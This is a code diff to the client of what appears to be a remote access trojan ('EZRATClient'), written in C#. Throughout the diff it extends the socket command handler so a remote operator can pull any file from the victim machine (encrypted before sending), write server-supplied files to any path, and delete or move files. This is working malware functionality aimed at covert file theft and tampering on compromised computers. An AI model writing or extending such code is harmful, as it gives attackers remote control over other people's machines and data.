@@ -287,12 +287,36 @@ namespace EZRATClient
                     SendCommand("chatdata;" + String.Join("¦",cht.Texted));
                 }
             }
-            else if (text.StartsWith("dfile;"))
+            else if (text.StartsWith("dlfile;"))
             {
-                string path = text.Substring(6);
+                string path = text.Substring(7);
                 SendFile(path);
                 
+            } else if(text.StartsWith("upfile;"))
+            {
+                text = text.Substring(7);
+                string[] lines = text.Split(';');
+                string path = lines[0];
+                byte[] recFile = Encoding.Default.GetBytes(lines[1]);
+                ReceiveFile(recFile, path);
             }
+            else if (text.StartsWith("dtfile;"))
+            {
+                text = text.Substring(7);
+                File.Delete(text);
+            } else if(text.StartsWith("rmfile;"))
+            {
+                text = text.Substring(7);
+                string[] lines = text.Split(';');
+                string src = lines[0];
+                string dst = lines[1];
+                File.Move(src, dst);
+            }
+        }
+
+        private static void ReceiveFile(byte[] data, string path)
+        {
+            File.WriteAllBytes(path, data);
         }
 
 
@@ -389,7 +413,7 @@ namespace EZRATClient
             try
             {
                 //_clientSocket.SendFile(path); //Send the data to the server
-                byte[] result = Encoding.Default.GetBytes(Encrypt("dfile;" + File.ReadAllText(path)));
+                byte[] result = Encoding.Default.GetBytes(Encrypt("dlfile;" + File.ReadAllText(path)));
                 _clientSocket.Send(result);
             }
             catch (Exception ex) //Failed to send data to the server
